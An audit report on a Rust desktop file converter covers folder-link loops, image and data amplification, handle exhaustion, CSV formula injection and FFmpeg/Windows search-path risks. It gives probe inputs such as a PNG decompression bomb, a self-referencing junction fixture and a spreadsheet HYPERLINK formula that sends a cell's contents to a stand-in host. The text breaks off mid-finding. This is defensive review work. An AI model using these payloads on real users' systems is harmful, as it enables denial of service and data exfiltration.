# ConvertCraft — Rust security and correctness audit

**Date:** 2026-10-21 · **Revision:** `dc73167` (`master`, clean tree) · **Scope:** the whole repository (one binary crate, 3 source files, 1,664 lines)

This was a read-only review. No source file, manifest, or lockfile was changed. This file replaces the earlier audit of revision `41a79d1` (2026-10-18), which is still in Git history. Section 3.4 records what happened to each of that audit's findings. Probes ran from an external harness in the session scratchpad that compiles the **unchanged** `src/output.rs` and `src/converter.rs` through `#[path]` (details in §3.3).

---

## 1. Executive summary

**Overall risk: Medium, almost entirely from availability problems.** There is no first-party `unsafe`, no shell, no network listener, and no credential handling. No memory-safety bug, remote code execution, or data-corruption path was found in first-party code. PR #11 (`src/output.rs`: staged, identity-checked, no-clobber publication) **fixes** the four data-integrity findings from the previous audit, and its 20 tests pass, including the real-symlink tests. What remains is mostly that a single hostile file or folder can freeze the UI, exhaust memory, or stop a batch.

Top issues:

1. **F-01 (Medium, Confirmed).** Folder import follows directory links recursively **on the UI thread**, with no visited set and no budget. A folder holding one file plus two junctions pointing back at itself had not finished after 5 s. By then it had visited 1,853 directories and queued **the same file 1,789 times**. The traversal space is exponential, so the app freezes and has to be killed.
2. **F-02 (Medium, Confirmed).** Image decompression amplification. A **260,811-byte PNG** (16384×16384 grayscale) drove one conversion to **1.35 GB peak working set** and wrote a **1 GiB BMP**. `image`'s 512 MiB decode limit doesn't help, because `to_rgba8()`/`to_rgb8()` allocate after decoding. Four workers run such jobs in parallel.
3. **F-03 (Medium, Confirmed).** Structured-data amplification. Sparse JSON→CSV grows quadratically: 46,891 B became 16,026,890 B, with the whole output held in memory. A 7,116-byte YAML alias file became 4,108,131 bytes of JSON. There is no input-size or expansion budget.
4. **F-04 (Low, mechanism Confirmed / Unix failure Plausible).** Every queued job holds **two OS handles** for the entire batch: 2,000 queued files raised the process handle count from 67 to 4,067. On Unix those are file descriptors, and the soft limit is commonly 1024 on Linux and 256 on macOS. Std does not raise it, so batches above roughly 100–500 files will fail with `EMFILE`.
5. **F-05 / F-06 (Low).** CSV export emits spreadsheet formulas verbatim (documented, not mitigated). Separately, one missing, stale, or special-file row (for example a dangling `x.json` symlink inside an imported folder) fails the **whole** batch.

Tooling: `cargo check`, `clippy` (pedantic plus restriction lints), `cargo test` (20/20), and Miri on in-memory tests all pass. `cargo audit` fails: two `quick-xml 0.30.0` advisories, both on a Linux-only accessibility/proc-macro path, plus 9 "unmaintained" warnings including `unsafe-libyaml`, which is reached directly by YAML input. `cargo deny` fails because no `deny.toml` exists. `cargo geiger` cannot analyse this bin-only crate.

---

## 2. Assumptions (please correct)

**What it is.** ConvertCraft is a native desktop GUI (eframe/egui) batch converter. It converts **images** (decoded and encoded in-process by the `image` crate), **structured data** (JSON/YAML/TOML/CSV through a `serde_json::Value`), and **audio/video** (by spawning an external `ffmpeg` found on `PATH`). The README tells users to build from source with `cargo build --release --locked`; there are no binary releases. There is no library target, no CLI mode, no network listener, no plugins, no persisted settings, and no CI configuration in the repo.

**Entry points.**
- `src/main.rs:16` `main`: an embedded logo, then `App::new`, which **runs `ffmpeg -version` synchronously at startup** (`main.rs:92`).
- Files and folders enter through the file dialogs (`main.rs:253, 258, 343`) and drag-and-drop (`main.rs:466-476`), both going to `App::add_path` (`main.rs:104`).
- Convert (`main.rs:129` `App::start`) does `OutputPlanner::new` and `plan` on the UI thread, then hands off to up to 4 detached worker threads. Each worker runs `converter::convert` (`converter.rs:116`), then `StagedOutput::commit` (`output.rs:198`).
- "Done" link: `reveal()` (`main.rs:512`) spawns `explorer` / `open` / `xdg-open`.

**Trust boundaries.**

| Boundary | Attacker control | Reached code |
|---|---|---|
| File **contents** | Full | `image` decoders (format sniffed from content), `serde_json`, `serde_yaml` → `unsafe-libyaml`, `toml`, `csv`, FFmpeg demuxers/decoders |
| File **names and topology** | Names, nesting, symlinks/junctions, special files, count | `add_path` traversal, `OutputPlanner` (`output.rs`), output naming (stem + fixed extension) |
| Output directory | User-chosen; may be shared or writable by others | `output.rs` staging and publication |
| Process environment | Trusted (PATH, application directory) | `Command::new("ffmpeg")`, `Command::new("explorer")` |
| Downstream consumers | n/a: they consume our output | CSV opened in spreadsheets |
| Build | Trusted (crates.io, lockfile committed) | 491 locked packages, build scripts, proc macros |

**Threat model.** The attacker gets the user to import a file, archive, folder, or network share they control: "convert this for me". The attacker has no code execution on the machine and only the user's filesystem privileges. A stronger, rarer attacker can also write to the output directory or an ancestor of it while a conversion runs. The project documents that hostile output directories are out of scope (`docs/user-guide.md:40`, `docs/development.md:75`), and I treat them as out of scope too. Severity is judged for a single-user desktop app: hangs and out-of-memory errors are availability issues, not service-wide outages. Losing user data or modifying an input file would rank higher, and nothing like that remains.

---

## 3. Tooling results

Host: Windows 11 x86_64-pc-windows-msvc · `rustc 1.97.1` / `cargo 1.97.1` · nightly `1.101.0` (Miri) · `cargo-audit 0.22.2` · `cargo-deny 0.20.2` · `cargo-geiger 0.14.0` · FFmpeg `2025-07-17-git-bc8d06d541` (gyan.dev essentials). Every tool was already installed, so nothing needed installing.

### 3.1 Requested commands

| Command | Result | Notes |
|---|---|---|
| `cargo check --all-targets --all-features` | ✅ pass | — |
| `cargo clippy --all-targets --all-features -- -W clippy::pedantic -W clippy::unwrap_used -W clippy::expect_used -W clippy::panic -W clippy::indexing_slicing -W clippy::arithmetic_side_effects` | ✅ pass, warnings | bin: 20 warnings; test target: 174 (mostly `unwrap` in tests). Triage below. |
| `cargo test --all-features` | ✅ 20 passed / 0 failed | The FFmpeg tests really ran, because FFmpeg is installed. Symlink tests really ran (run with `--nocapture`, no skip diagnostic printed). |
| `cargo audit` | ❌ exit 1 | 2 vulnerabilities (`quick-xml 0.30.0`: RUSTSEC-2026-0194, -0195), 9 unmaintained warnings. See F-11. |
| `cargo deny check` | ❌ exit 5 | `advisories FAILED, bans ok, licenses FAILED, sources ok`. **No `deny.toml`**, so the default empty license allowlist produces 444 `rejected` errors. 42 duplicate-version warnings. No git sources. |
| `cargo geiger` | ❌ exit 1 | Built everything, then failed with `Io(NotFound) "D:\Github\ConvertCraft\src\lib.rs"`: geiger expects a lib target. It also logged ~85 "Failed to match package" lines. It produced no counts. |
| `rg '\bunsafe\b\|extern "C"\|repr(C)\|transmute\|from_raw_parts\|MaybeUninit\|impl (Send\|Sync)\|\*const\|\*mut\|impl Drop' src` | 0 matches | The first-party unsafe inventory is empty (§6). There is no `build.rs` and no `#![forbid(unsafe_code)]`. |
| `cargo +nightly miri test jpeg_flush_error_is_returned` | ✅ 1 passed | In-memory JPEG encode through `image` + `BufWriter`. The other in-crate tests use the Windows filesystem, which Miri doesn't support here. |
| `cargo +nightly miri test` (harness `miri_parsers`) | ✅ 2 passed | `serde_yaml` (anchors, aliases, undefined/cyclic alias, malformed input, duplicate keys, complex keys), `serde_json`, `toml`, `csv` inputs. No UB reported. This is a small sample, not proof. |

**Clippy triage (bin target).** No warning points at an attacker-reachable panic:
- `converter.rs:89` `cat.targets()[0]`: the arrays are constant and non-empty.
- `main.rs:213, 216` `self.files[i]`: indices come from jobs built in `start()`, and every control that mutates `files` is disabled while `rx` is `Some`. Drag-and-drop is guarded by `!self.running()` (`main.rs:474`). The empty-state click (`main.rs:342`) can only show when `files` is empty, which can't happen while running.
- `main.rs:193` `queue.lock().unwrap()`: the guard covers only `Vec::pop`, which can't panic, so the mutex can't be poisoned.
- `main.rs:17` `expect` runs on compile-time embedded bytes.
- `main.rs:125, 215` `+= 1` on `usize` counters can't realistically overflow. `main.rs:317` `usize as f32` affects only the progress display.
- The rest are style: collapsible `if`, `for_each`, function length.

### 3.2 Dependency facts

- `quick-xml 0.30.0` comes in only through `zbus_xml ← zbus-lockstep(-macros) ← atspi-common ← accesskit_unix ← egui-winit ← eframe`, on Linux targets. `cargo tree -i quick-xml@0.30.0` without `--target all` prints nothing on Windows.
- `unsafe-libyaml 0.2.11` (unmaintained) is the backend of `serde_yaml 0.9.34+deprecated`. It **directly parses attacker YAML** (`converter.rs:192`).
- `image 0.25.10` is built with **default features**, which include `exr`, `hdr`, `dds`, `ff`, `pnm`, `avif`, and `rayon` (`image-0.25.10/Cargo.toml:73-93`). Combined with `with_guessed_format()`, decoders the UI never advertises become reachable (F-10).

### 3.3 Probe harness (external; repository untouched)

`…\scratchpad\harness\` is a crate that copies the repo's `Cargo.lock` and includes the real modules:

```rust
#[path = "D:/Github/ConvertCraft/src/output.rs"]    mod output;
#[path = "D:/Github/ConvertCraft/src/converter.rs"] mod converter;
fn conv(input: &Path, dir: &Path, cat: Category, target: &str) -> anyhow::Result<PathBuf> {
    let mut planner = OutputPlanner::new([input])?;
    let plan = planner.plan(input, Some(dir), target, false)?;
    converter::convert(input, plan, cat, target, &Options::default())
}
```

It was built with `cargo build --release --offline`. Probe results are cited in each finding. For the folder-import probe, `App::add_path` lives in `main.rs` next to the GUI, so the probe uses a **verbatim replica** of its traversal with a counter and a 5 s cap added.

### 3.4 Status of the previous audit's findings (rev `41a79d1`)

| Prior ID | Topic | Status at `dc73167` | Evidence |
|---|---|---|---|
| CC-01 | No-overwrite not enforced at write time | **Fixed** | `persist_noclobber` when no destination existed at planning time (`output.rs:237-246`). Tests: `new_destination_after_planning_is_not_overwritten`, `independent_planners_cannot_publish_over_each_other`, `late_destination_symlink_does_not_modify_its_target`. |
| CC-02 | Failed conversion deletes or truncates the old output | **Fixed** | All backends write to a staged temp file in the destination directory, published only after `sync_all` (`output.rs:154-202`). Tests: `failed_{jpeg,data,ffmpeg}_conversion_preserves_existing_output`. |
| CC-03 | Outputs could alias other batch inputs | **Fixed** | `ProtectedInputs` uses case-folded canonical paths plus `same_file::Handle` identities (`output.rs:46-74, 104-117, 210-213`). Tests: cross-format, case-alias, hard-link, and symlinked-parent tests. |
| CC-04 | Recursive link-following import on the UI thread | **Open** → F-01 | `main.rs:104-127` unchanged. Now reproduced. |
| CC-05 | Unbounded structured-data expansion | **Open** → F-03; images split out as F-02 | `converter.rs:189, 252-289` unchanged. |
| CC-06 | JPEG `BufWriter` flush error swallowed | **Fixed** | `encode_jpeg` flushes explicitly (`converter.rs:177-184`), every image path flushes (`:173`), and commit does `sync_all` (`output.rs:199-202`). Test: `jpeg_flush_error_is_returned` (also passes under Miri). |
| CC-07 | CSV formula injection | **Open** → F-05 (re-rated Low; see rationale) | `converter.rs:276, 282`. |
| CC-08 | quick-xml advisory / unmaintained YAML | **Open** → F-11 | Unchanged lockfile entries. |
| MIN-01 | Duplicate keys and numeric inference | **Open** → M-1 | Re-verified. |
| MIN-02 | Swallowed import errors; shared test fixtures | **Partly fixed** | Tests now use `tempfile::tempdir()`. Import errors are still swallowed (M-3). |

**Residual risk in the fix (accepted and documented).** In replace mode, the identity check (`output.rs:220-228`) and `persist` (`:233`) are separate path operations, not a compare-and-swap. This is less dangerous than it looks: `rename` replaces a *directory entry* and never writes *through* a link. So even if an attacker swaps in a hard link or symlink to a protected source during that window, the source's **content** survives; only the planted name is replaced. Ancestor-directory swaps are acknowledged in `docs/development.md:75`. I found no remaining way to corrupt the content of any file other than the planned destination.

---

## 4. Findings table

| ID | Severity | Category | Location | Summary | Status |
|---|---|---|---|---|---|
| F-01 | **Medium** | DoS / FS traversal | `src/main.rs:104-127` | Recursive, link-following, unbounded folder import on the UI thread; exponential with two self-links | Confirmed (replica probe) |
| F-02 | **Medium** | DoS / decompression bomb | `src/converter.rs:138-142, 170, 180` | 260 KB PNG → 1.35 GB peak RSS + 1 GiB output; post-decode conversions bypass `image` limits; ×4 workers | Confirmed (probe) |
| F-03 | **Medium** | DoS / amplification | `src/converter.rs:189, 192, 266-288` | Unbounded `read_to_string`; O(N²) sparse CSV header union and cells, all in memory; YAML alias expansion | Confirmed (probe) |
| F-04 | Low | Resource exhaustion | `src/output.rs:20, 65-68, 92-93, 113-118`; `src/main.rs:143-172` | 2 OS handles held per queued job for the whole batch; `EMFILE` on Unix for moderately sized batches | Mechanism confirmed; Unix failure plausible |
| F-05 | Low | Output injection | `src/converter.rs:276, 282` | Formula-leading header and cell values written verbatim to CSV | Confirmed (probe) |
| F-06 | Low | Robustness / DoS | `src/output.rs:49-68`; `src/main.rs:130-142` | One missing, dangling-link, or special-file row fails the entire batch | Confirmed (probe) |
| F-07 | Low | Concurrency / lifecycle | `src/main.rs:186-205, 222-224`; `src/converter.rs:371-376` | No panic isolation in workers; closing the app orphans FFmpeg children and staging directories | Confirmed (code); panic trigger not found |
| F-08 | Low | External process boundary | `src/converter.rs:370-395` | FFmpeg: no deadline or cancel, unbounded stderr capture, no demuxer/protocol allowlist | Confirmed (code); inclusion attacks **failed** on tested build (Needs verification on others) |
| F-09 | Low | Binary planting (Windows) | `src/converter.rs:293-310`; `src/main.rs:92, 514-516` | `ffmpeg` (auto-run at startup) and `explorer` resolve from the **application directory** before System32/PATH | Confirmed (std source); exploitation needs a file planted next to the exe |
| F-10 | Low | Attack surface | `src/converter.rs:138-140`; `Cargo.toml:12` | Content sniffing plus default `image` features reach undeclared decoders (EXR, HDR, DDS, farbfeld) | Confirmed (probe) |
| F-11 | Low | Dependencies / build policy | `Cargo.lock` (`quick-xml 0.30.0`, `unsafe-libyaml 0.2.11`); no `deny.toml`, no CI | Advisories (Linux-only path), unmaintained parser reached by input, no policy gate | Confirmed (tools); exploitability not established |
| M-1…M-6 | Info | Minor | various | Data fidelity, `\\?\` paths given to Explorer, swallowed import errors, UI-thread blocking, identity on exotic file systems, post-planning source swap | see §5 Minor |

---

## 5. Detailed findings

### F-01 — Folder import: unbounded, link-following recursion on the UI thread (Medium, Confirmed)

**Evidence** (`src/main.rs:104-117`):

```rust
fn add_path(&mut self, path: PathBuf) {
    if path.is_dir() {                                   // follows symlinks/junctions
        if let Ok(entries) = std::fs::read_dir(&path) {
            let mut children: Vec<_> = entries.flatten().map(|e| e.path()).collect();
            children.sort();
            for child in children {
                self.add_path(child);                    // native recursion, no depth/visited/budget
            }
        }
        return;
    }
    if self.files.iter().any(|f| f.path == path) {       // lexical dedupe, O(n) per file
```

It is called synchronously from the egui `update` handlers: the dialogs at `main.rs:253-259, 343-345` and drag-and-drop at `main.rs:475`.

**Trigger.** An attacker ships a folder (tarball, git repo, network share, or USB stick) containing directory links back to an ancestor: `a -> .`, `b -> .`. The user drags it into ConvertCraft.

**Reproduction (executed).** Fixture: `loop\one.json`, `loop\a` and `loop\b` both junctions to `loop` (`mklink /J`, no admin needed). The replica of the traversal above, capped at 5 s:

```
finished=false elapsed_ms=5000 dirs_visited=1853 queued_files=1789 longest_path_chars=260
```

Every one of the 1,789 queue entries is the same `one.json` under a different `a\b\a\…` path. The path space grows like 2^depth up to the OS limit, which is about 63 reparse points per path on Windows and ~40 symlinks (ELOOP) on Linux. In practice it **never finishes**: the window stops repainting and the user must kill the process. The lexical `any()` dedupe also makes the traversal quadratic. Had it finished, the planner would then give each alias a separate output: `one (1).yaml`, `one (2).yaml`, and so on.

**Impact.** A guaranteed UI hang with unbounded memory growth from one drag-and-drop, plus enumeration outside the folder the user picked (a link to `C:\Users\<user>` gets walked). It does not corrupt data. The behaviour is documented (`docs/user-guide.md:23`), but documentation is not a mitigation.

**Fix sketch.**

```diff
-fn add_path(&mut self, path: PathBuf) {
-    if path.is_dir() {
-        if let Ok(entries) = std::fs::read_dir(&path) { … self.add_path(child) … }
+// Run on a background thread; send discovered files back over a channel.
+fn scan(root: PathBuf, tx: Sender<ScanEvent>, cancel: &AtomicBool) {
+    let mut stack = vec![(root, 0usize)];
+    let mut seen_dirs = HashSet::new();             // same_file::Handle or (dev, ino)
+    let mut budget = Budget { files: 50_000, dirs: 10_000, depth: 64 };
+    while let Some((path, depth)) = stack.pop() {
+        if cancel.load(Relaxed) { break; }
+        let md = match fs::symlink_metadata(&path) { Ok(m) => m, Err(e) => { tx.send(ScanEvent::Error(path, e)); continue } };
+        if is_link(&md) { tx.send(ScanEvent::SkippedLink(path)); continue; }   // default: don't follow
+        if md.is_dir() {
+            if depth >= budget.depth || !seen_dirs.insert(Handle::from_path(&path)?) || !budget.take_dir() { continue; }
+            for entry in fs::read_dir(&path)? { stack.push((entry?.path(), depth + 1)); }
+        } else if md.is_file() && budget.take_file() {
+            tx.send(ScanEvent::File(path));
+        }
+    }
+}
```

Also switch the queue dedupe to a `HashSet` keyed by file identity.

**Regression test sketch.** Create `root/one.json` plus two directory links back to `root`. Assert `scan` completes within 1 s and yields `one.json` exactly once.

---

### F-02 — Image decompression amplification bypasses `image`'s limits (Medium, Confirmed)

**Evidence** (`src/converter.rs:138-142, 170, 180`):

```rust
let img = image::ImageReader::open(input)?.with_guessed_format()?.decode()?;   // default Limits
…
DynamicImage::ImageRgba8(img.to_rgba8()).write_to(&mut writer, format)?;       // :170
…
encoder.encode_image(&DynamicImage::ImageRgb8(image.to_rgb8()))?;              // :180 (JPEG)
```

`Limits::default()` is `max_alloc = 512 MiB` with **no width or height limit** (`image-0.25.10/src/io/limits.rs:49-55`). The limit governs only the decoder's own buffer. `to_rgba8()` on an 8-bit grayscale image allocates **4×** the decoded size and isn't covered. Up to 4 workers do this concurrently (`main.rs:182-184`).

**Reproduction (executed, release build).** `bomb.png` is a 16384×16384 all-zero L8 PNG of **260,811 bytes**.

| Target | Peak working set | Output | Time |
|---|---|---|---|
| bmp | **1,347,612,672 B** | **1,073,741,946 B** written | 3.75 s |
| jpg | 1,079,500,800 B | 7,340,659 B | 3.60 s |
| png (no RGBA conversion) | 276,713,472 B | 1,341,557 B | 0.12 s |

A folder of four such files, or the same file four times thanks to F-01, needs about 5.4 GB of RAM and 4 GiB of disk at once. An L8 image right at the 512 MiB limit (~23170²) roughly doubles these figures. GIF output also runs NeuQuant quantisation over the full image (CPU-heavy). ICO runs a Lanczos resize from full resolution.

**Impact.** Out-of-memory termination of the app or heavy system swapping, plus disk exhaustion in the output directory. It's triggered by an innocuous-looking, sub-megabyte image.

**Fix sketch.**

```diff
-let img = image::ImageReader::open(input)?.with_guessed_format()?.decode()?;
+let mut reader = image::ImageReader::open(input)?.with_guessed_format()?;
+let mut limits = image::Limits::default();
+limits.max_image_width = Some(MAX_SIDE);          // e.g. 16_384
+limits.max_image_height = Some(MAX_SIDE);
+limits.max_alloc = Some(MAX_DECODE_BYTES);        // e.g. 256 MiB
+reader.limits(limits);
+let img = reader.decode()?;
+let rgba_bytes = u64::from(img.width()) * u64::from(img.height()) * 4;
+ensure!(rgba_bytes <= MAX_RGBA_BYTES, "image too large to convert ({}×{})", img.width(), img.height());
```

Also add a process-wide memory semaphore, so that four concurrent jobs share one budget instead of each getting its own.

---

### F-03 — Structured-data amplification (Medium, Confirmed)

**Evidence.**
- `src/converter.rs:189`: `std::fs::read_to_string(input)` with no size limit, which also blocks forever if the path became a FIFO (M-6).
- `:192`: `serde_yaml::from_str` expands aliases into an owned `Value`.
- `:266-273`: the CSV header union uses `Vec::contains`, which is O(N·K).
- `:275-288`: every row emits a field for every header, so N rows with distinct keys give N² cells. The whole document goes into `Writer<Vec<u8>>`, then `String::from_utf8`, then the file.

```rust
let mut headers: Vec<&str> = Vec::new();
for row in &rows { for key in row.keys() { if !headers.contains(&key.as_str()) { headers.push(key); } } }
let mut writer = csv::Writer::from_writer(Vec::new());
```

**Reproduction (executed, release build).** Input of the form `[{"k0":0},{"k1":0},…]` converted to CSV:

| rows | input bytes | output bytes | time |
|---|---|---|---|
| 1,000 | 10,891 | 1,005,890 | 25 ms |
| 2,000 | 22,891 | 4,012,890 | 78 ms |
| 4,000 | 46,891 | 16,026,890 | 211 ms |

Growth is quadratic. Extrapolating, 40,000 rows (~0.5 MB input) gives about 1.6 GB of output held in memory, roughly twice over during `into_inner` and `from_utf8` (not run). Separately, YAML `anchor: &s <4096×'x'>` with `refs: [*s × 1000]` turned **7,116 bytes into 4,108,131 bytes** of JSON. `serde_yaml` does cap recursion and alias depth, so this is shallow amplification, not an unbounded billion-laughs expansion.

**Fix sketch.**

```diff
-let text = std::fs::read_to_string(input).context("cannot read file")?;
+let mut text = String::new();
+File::open(input)?.take(MAX_DATA_INPUT + 1).read_to_string(&mut text)?;
+ensure!(text.len() as u64 <= MAX_DATA_INPUT, "data file too large");
 …
-if !headers.contains(&key.as_str()) { headers.push(key); }
+if seen.insert(key.as_str()) { headers.push(key); }
+ensure!(headers.len() <= MAX_CSV_COLUMNS, "too many CSV columns");
+ensure!(rows.len().saturating_mul(headers.len()) <= MAX_CSV_CELLS, "CSV would be too large");
-let mut writer = csv::Writer::from_writer(Vec::new());
+let mut writer = csv::Writer::from_writer(BufWriter::new(output));   // stream into the staged file
```

---

### F-04 — Two OS handles per queued job, held for the whole batch (Low; mechanism Confirmed, Unix failure Plausible)

**Evidence.**
- `ProtectedInputs.files: HashSet<Handle>` keeps one open handle per input, deliberately (`output.rs:19-20, 65-68`).
- Every `OutputPlan` also keeps `directory_handle: Handle` (`:92-93, 138`) and possibly `existing: Option<Handle>` (`:113-118`).
- `App::start` builds **all** plans before any worker starts (`main.rs:143-172`).
- On Unix, `same_file::Handle` holds `file: Option<File>`, i.e. an open file descriptor (`same-file-1.0.6/src/unix.rs:9-15`). Std does not raise `RLIMIT_NOFILE`.

**Reproduction (executed on Windows; the handle count stands in for the fd count).** 2,000 inputs planned into one output directory:

```
handles_before=67  handles_after_planner_new=2067  handles_with_2000_plans=4067  handles_after_drop=67
```

**Failure scenario (inferred, not run).** With a 256 soft limit (common macOS default) or 1024 (common Linux default), `OutputPlanner::new` or `plan` starts returning `EMFILE` ("Too many open files"). That happens at roughly 100–120 queued files on macOS and 450–500 on Linux, after subtracting the GUI's own descriptors. If `OutputPlanner::new` fails, every row is marked failed (F-06). If planning succeeds but leaves almost no free descriptors, workers then fail to open inputs and staging files. A batch converter failing on an ordinary 300-photo folder is a real functional defect. There's no data loss, and errors are surfaced.

**Fix sketch.** Store identity *keys* instead of open handles. A recycled ID can only cause a false positive here, which is the safe direction: it skips a name.

```diff
-    files: HashSet<Handle>,
+    files: HashSet<FileKey>,          // unix: (st_dev, st_ino) via MetadataExt; windows: Handle (cheap) or file ID
 …
-    directory_handle: Handle,
+    directory_key: FileKey,           // compare by key at begin()/commit()
```

Alternatively, or as well, raise the soft `RLIMIT_NOFILE` to the hard limit at startup on Unix, and plan lazily per worker rather than all up front.

---

### F-05 — CSV export writes spreadsheet formulas verbatim (Low, Confirmed)

**Evidence** (`src/converter.rs:276, 282`): `writer.write_record(&headers)?;` and `Some(Value::String(s)) => s.clone()`. Neither keys nor values are neutralised.

**Reproduction (executed).** Input `[{"cell":"=HYPERLINK(\"http://example.invalid/?x=\"&A1,\"click\")","=1+1":"literal","n":"@SUM(1,2)"}]` produces:

```csv
=1+1,cell,n
literal,"=HYPERLINK(""http://example.invalid/?x=""&A1,""click"")","@SUM(1,2)"
```

**Impact.** When the user opens the converted CSV in Excel, LibreOffice, or Sheets, attacker formulas run in the user's spreadsheet context. They can show misleading values or exfiltrate neighbouring cells through `HYPERLINK`/`WEBSERVICE`, depending on application settings. **Rated Low (the previous audit said Medium)** because it is documented (`docs/formats.md:73`), needs a second application and user interaction, and current spreadsheet apps gate external content behind prompts.

**Fix sketch.** Add an opt-in (or default-on) "spreadsheet-safe CSV" mode, keeping raw output available:

```diff
+fn spreadsheet_safe(s: &str) -> Cow<'_, str> {
+    match s.chars().next() {
+        Some('=' | '+' | '-' | '@' | '\t' | '\r') => Cow::Owned(format!("'{s}")),
+        _ => Cow::Borrowed(s),
+    }
+}
-writer.write_record(&headers)?;
+writer.write_record(headers.iter().map(|h| spreadsheet_safe(h)))?;
```

---

### F-06 — One unresolvable row fails the whole batch (Low, Confirmed)

**Evidence** (`src/output.rs:49-68`): every input must canonicalize, be a regular file, and open as a `Handle`, otherwise `OutputPlanner::new` returns `Err`. `App::start` then marks **every** non-done row failed and schedules nothing (`main.rs:130-142`). The planner covers *all* rows, including completed ones (`main.rs:131`).

**Reproduction (executed).** Queue `a.json` and `b.json`, delete `b.json`, then call `OutputPlanner::new([a, b])`:

```
planner error: cannot resolve source: …\b.json: Das System kann die angegebene Datei nicht finden. (os error 2)
```

**Triggers.**
- An attacker folder containing a dangling symlink named `x.json`, or a symlink to a device, FIFO, or directory (`is_file()` is false).
- A user who deletes originals after a successful run and then queues more files without first pressing "Clear finished" (a common workflow).
- A file that is locked or unreadable (a permission error on canonicalize or open).

**Impact.** No conversion happens at all, and every row shows the same error. That's an availability nuisance, and documented (`docs/development.md:51`).

**Fix sketch.**

```diff
-pub fn new<'a>(inputs: impl IntoIterator<Item = &'a Path>) -> Result<Self> {
+/// Returns the planner plus per-input errors; inputs that don't exist need no protection,
+/// inaccessible ones are protected by lexical key only and their rows are failed individually.
+pub fn new<'a>(inputs: impl IntoIterator<Item = &'a Path>) -> (Self, Vec<(usize, anyhow::Error)>) {
```

---

### F-07 — Worker panics and app shutdown are unmanaged (Low, Confirmed by code)

**Evidence.**
- Workers are detached `thread::spawn` loops with no `catch_unwind` (`main.rs:191-204`).
- A panic anywhere in a decoder, encoder, or parser ends that worker after `Msg::Started` was sent, so the row stays **Running** forever. When all senders drop, `poll` only sets `rx = None` (`main.rs:222-224`).
- If all 4 workers panic, the jobs still queued never run, and the progress bar never reaches `total`.
- Release builds use `windows_subsystem = "windows"`, so the panic message goes nowhere.
- When the window closes, `main` returns and the process exits without joining workers. Destructors in those threads don't run, leaving `.convertcraft-XXXX` staging directories (with partial data) in the user's folders.
- `ffmpeg` children (`converter.rs:371-376`) are not in a job object or process group, so on Windows they keep running to completion after the GUI exits.

No concrete panicking input was found in the locked decoders during this review. The panic trigger is **Plausible**; the missing handling is **Confirmed**. The project documents this (`docs/development.md:61, 75`).

**Fix sketch.**

```diff
-let result = converter::convert(&job.input, job.output, job.category, job.target, &opts)
-    .map_err(|e| format!("{e:#}"));
+let result = std::panic::catch_unwind(AssertUnwindSafe(|| {
+    converter::convert(&job.input, job.output, job.category, job.target, &opts)
+}))
+.unwrap_or_else(|_| Err(anyhow!("internal error while converting (panic)")))
+.map_err(|e| format!("{e:#}"));
```

In `poll`'s `Disconnected` arm, mark leftover Running and Pending rows failed. Keep `JoinHandle`s and `Child`s; on exit (`eframe::App::on_exit`), set a cancel flag, kill the children (or put them in a Windows job object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`), and join.

---

### F-08 — FFmpeg boundary: no deadline, unbounded stderr, unrestricted demuxers (Low; Needs verification across FFmpeg builds)

**Evidence** (`src/converter.rs:371-376`):

```rust
ffmpeg_command().args(["-y", "-hide_banner", "-loglevel", "error", "-i"]).arg(input)
    .args(ffmpeg_args(target)).arg(output).output();
```

- `.output()` blocks the worker with no timeout or cancel, and buffers **all** of stdout and stderr in memory. A corrupt stream can make FFmpeg log an error per packet even at `-loglevel error`.
- No `-protocol_whitelist` or `-format_whitelist` is passed, so FFmpeg picks the demuxer by probing content. Historically that enabled HLS and concat playlists disguised as `.mp4`/`.avi` that pull **other local files** into the output (a "convert this and send it back" exfiltration pattern).
- Argument handling is sound. There's no shell; `input` always follows `-i`, so a leading `-` can't become an option. Dialog and drop paths are absolute, so no `proto:` prefix can come from a filename. The output is a staged absolute path.

**Probe (executed through the real backend, FFmpeg 2025-07-17).** I created `victim\secret.ts` (MPEG-TS audio), then attack files: HLS playlists naming it by absolute path, by `file:` URL, and by `../` relative path, saved as `.mp4` and as `.ts`, plus an `ffconcat` file saved as `.mp4`. **All five were rejected** (`End of file`, `Invalid data found`, `Operation not permitted`), and no output was published. This build's HLS extension checks and concat `safe=1` held. Older or differently configured FFmpeg builds were **not** tested. Because the app uses whatever `ffmpeg` is on PATH, its exposure is whatever that build's exposure is.

**Fix sketch.**

```diff
-.args(["-y", "-hide_banner", "-loglevel", "error", "-i"]).arg(input)
+.args(["-y", "-nostdin", "-hide_banner", "-loglevel", "error",
+       "-protocol_whitelist", "file",
+       "-format_whitelist", MEDIA_DEMUXERS,   // mov,mp4,m4a,matroska,webm,avi,mp3,wav,flac,ogg,aac,asf,flv,mpeg,mpegts,aiff
+       "-i"]).arg(input)
-.output();
+.stderr(Stdio::piped()).spawn()?;   // read stderr into a capped ring buffer; wait with deadline; kill on cancel/timeout
```

Check `-format_whitelist` behaviour against the FFmpeg versions you support before relying on it.

---

### F-09 — Windows resolves `ffmpeg` and `explorer` from the application directory first (Low, Confirmed by std source)

**Evidence.**
- `Command::new("ffmpeg")` (`converter.rs:294`) runs automatically at **startup** (`main.rs:92` → `ffmpeg_available()`) and for every media job.
- `Command::new("explorer")` (`main.rs:514`) runs on clicking "Done".
- Rust std on Windows searches the child's PATH, then the **directory of the current executable**, then System32/Windows, then the parent's PATH (`library/std/src/sys/process/windows.rs`, `search_paths`, comments "1. Child paths … 2. Application path … 3 & 4. System paths").

**Scenario.** Someone copies `convertcraft.exe` to a shared or download folder; there are no official binaries, but users share builds. An `ffmpeg.exe` placed in the same folder runs with the user's privileges as soon as ConvertCraft starts, and an `explorer.exe` there runs on the first "Done" click. When the exe stays in `target/release/` as the README describes, the precondition is unrealistic. That's why this is Low. It's the same class as Windows DLL search-order planting, which affects most executables run from Downloads.

**Fix sketch.** Launch `explorer` by absolute path (`%SystemRoot%\explorer.exe`). Resolve `ffmpeg` explicitly from `PATH`, excluding the exe directory, or from a user-configured path. Show the resolved path in the header tooltip.

---

### F-10 — Content sniffing reaches undeclared image decoders (Low, Confirmed)

**Evidence.** `with_guessed_format()` (`converter.rs:140`) lets magic bytes override the extension. `image` is built with default features (`Cargo.toml:12`), so the EXR, HDR, DDS, farbfeld, and PNM decoders are compiled in and reachable, although `detect()` (`converter.rs:65-79`) and the README list only PNG/JPEG/WebP/BMP/GIF/TIFF/ICO/TGA/QOI/PNM.

**Reproduction (executed).** I saved a 4×4 OpenEXR image as `photo.png` and converted it to BMP:

```
